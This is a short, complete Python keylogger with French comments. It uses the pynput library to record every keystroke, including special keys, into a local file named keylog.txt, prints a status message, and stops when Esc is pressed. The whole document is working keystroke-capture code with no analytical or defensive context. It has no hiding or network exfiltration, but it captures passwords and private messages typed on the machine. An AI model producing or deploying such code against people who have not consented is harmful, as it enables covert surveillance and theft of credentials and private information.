from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            else:
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"Erreur : {e}")

def on_release(key):
    if key == keyboard.Key.esc:  # Arrête le keylogger en appuyant sur Échap
        print("Arrêt du keylogger...")
        return False

print("Keylogger en cours... (appuie sur Échap pour arrêter)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
